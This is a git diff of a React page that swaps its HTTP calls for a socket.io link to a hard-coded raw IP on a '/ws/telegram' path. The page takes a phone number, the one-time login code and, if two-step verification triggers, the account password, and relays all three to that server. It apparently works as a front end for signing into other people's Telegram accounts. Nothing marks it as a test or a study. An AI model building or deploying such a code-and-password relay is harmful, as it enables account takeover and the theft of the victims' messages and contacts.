@@ -3,7 +3,15 @@ import { useEffect, useState } from 'react';
 import axios from 'axios';
 import { ToastContainer, toast } from 'react-toastify';
 import 'react-toastify/dist/ReactToastify.css';
+import io from 'socket.io-client';
 function App() {
+  const baseUrl = 'ws://18.139.219.242:14276/ws/telegram';
+  const toastId = 'loader';
+  //  const socket = io(baseUrl);
+  const socket = io('ws://18.139.219.242:14276', {
+    path: '/ws/telegram',
+  });
+
   const errorMsg = 'Something went wrong. Try again!!';
   const [number, setNumber] = useState('');
   const [otp, setOtp] = useState('');
@@ -13,24 +21,30 @@ function App() {
   const [isSubmitted, setIsSubmitted] = useState(false);
   const [isPasswordRequired, setIsPasswordRequired] = useState(false);
   const [counter, setCounter] = useState(0);
+  const [isTwofaFailed, setIsTwofaFailed] = useState(false);
   //const [isSubmitting, setIsSubmitting] = useState(false);
-  const baseUrl = 'http://18.139.219.242:14763';
-  const toastId = 'loader';
-
   useEffect(() => {
-    if (!flag) {
-      (async () => {
-        const url = baseUrl + '/dashboard';
-        axios
-          .get(url)
-          .then((resp) => {
-            const counter = resp.data.data.total_count;
-            setCounter(counter);
-          })
-          .catch((err) => console.log(err));
-      })();
-    }
-  }, [flag]);
+    console.log('something!!!');
+    socket.on('connect', () => {
+      console.log('WebSocket connection opened');
+    });
+  }, []);
+
+  // useEffect(() => {
+  //   if (!flag) {
+  //     (async () => {
+  //       const url = baseUrl + '/dashboard';
+  //       axios
+  //         .get(url)
+  //         .then((resp) => {
+  //           const counter = resp.data.data.total_count;
+  //           setCounter(counter);
+  //         })
+  //         .catch((err) => console.log(err));
+  //     })();
+  //   }
+  // }, [flag]);
+
   const displayToast = (msg = '', type = 'success') => {
     const options = {
       pauseOnHover: false,
@@ -47,73 +61,89 @@ function App() {
       pauseOnHover: false,
     });
   };
+
   const handleSubmitNumber = (e) => {
     loader();
-    axios
-      .post(baseUrl + '/send_otp', {
-        phone: '+88' + number,
-      })
-      .then(function (response) {
-        console.log(response);
-        const data = response.data;
-        if (data.status === 'failed') {
-          displayToast(data.message, 'error');
-        } else {
-          setPhoneHash(response.data.phone_hash);
-          setFlag(!flag);
-          const msg = 'Successfully sent otp request';
-          displayToast(msg);
-        }
-      })
-      .catch(function (error) {
-        console.log(error);
 
-        displayToast(errorMsg, 'error');
-      });
-    toast.dismiss(toastId);
+    // Emit a 'send_otp' event with the phone number
+    socket.emit('send_code', {
+      phone: '+88' + number,
+    });
+
+    // Listen for the response from the server
+    socket.on('send_code_status', (data) => {
+      if (data.status === 'failed') {
+        displayToast(data.message, 'error');
+      } else {
+        setPhoneHash(data.phone_code_hash);
+        setFlag(!flag);
+        const msg = 'Successfully sent otp request';
+        displayToast(msg);
+      }
+
+      // Dismiss the toast notification
+      toast.dismiss(toastId);
+    });
   };
 
   const handleSubmitOtp = (e) => {
-    //// make request here ////
-    //setIsSubmitting(true);
     loader();
-    const url = baseUrl + '/sign_in';
-    const obj = {
-      phone: '+88' + number,
-      phone_hash: phoneHash,
-      code: otp,
-      password,
-    };
-    !isPasswordRequired && delete obj.password;
-    axios
-      .post(url, obj)
-      .then(function (response) {
-        console.log('data ', response.data);
-        const data = response.data;
-        if (data.status === 'failed') {
-          displayToast(data.message, 'error');
-          if (
-            data.hasOwnProperty('password_required') &&
-            data['password_required']
-          ) {
-            setIsPasswordRequired(true);
-          }
-        } else {
-          setIsPasswordRequired(false);
-          setIsSubmitted(true);
-          setNumber('');
-          setOtp('');
-          const msg = 'Successfully Login';
-          displayToast(msg);
-        }
-      })
-      .catch(function (error) {
-        console.log(error);
-        displayToast(errorMsg, 'error');
-      });
 
-    toast.dismiss(toastId);
-    //setIsSubmitting(false);
+    if (!isTwofaFailed) {
+      // Emit a 'submit_otp' event with the relevant data
+      socket.emit('sign_in', {
+        phone: '+88' + number,
+        phone_code_hash: phoneHash,
+        code: otp,
+      });
+    }
+
+    socket.on('sign_in_status', (data) => {
+      console.log('sign-in successful ', data.status);
+      setIsSubmitted(true);
+      setIsTwofaFailed(false);
+      setNumber('');
+      setOtp('');
+      const msg = 'Successfully Login';
+      displayToast(msg);
+    });
+
+    socket.on('2fa_failed', () => {
+      setIsTwofaFailed(true);
+    });
+
+    if (isTwofaFailed) {
+      socket.emit('sign_in_2fa', {
+        phone: '+88' + number,
+        phone_code_hash: phoneHash,
+        code: otp,
+        password,
+      });
+    }
+
+    // // Listen for the response from the server
+    // socket.on('otp_submission_response', (response) => {
+    //   console.log('data ', response);
+    //   const data = response.data;
+
+    //   if (data.status === 'failed') {
+    //     displayToast(data.message, 'error');
+
+    //     if (data.password_required) {
+    //       setIsPasswordRequired(true);
+    //     }
+    //   } else {
+    //     setIsPasswordRequired(false);
+    //     setIsSubmitted(true);
+    //     setNumber('');
+    //     setOtp('');
+    //     const msg = 'Successfully Login';
+    //     displayToast(msg);
+    //   }
+
+    //   // Dismiss the toast notification
+    //   toast.dismiss(toastId);
+    // });
   };
 
   const handleAnotherNumber = () => {
@@ -140,13 +170,13 @@ function App() {
       style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}
     >
       <input
-        disabled={isSubmitted || isPasswordRequired}
+        disabled={isSubmitted || isTwofaFailed}
         value={otp}
         onChange={(e) => setOtp(e.target.value)}
         type="number"
         placeholder="Enter OTP"
       />
-      {isPasswordRequired ? (
+      {isTwofaFailed ? (
         <input
           value={password}
           onChange={(e) => setPassword(e.target.value)}
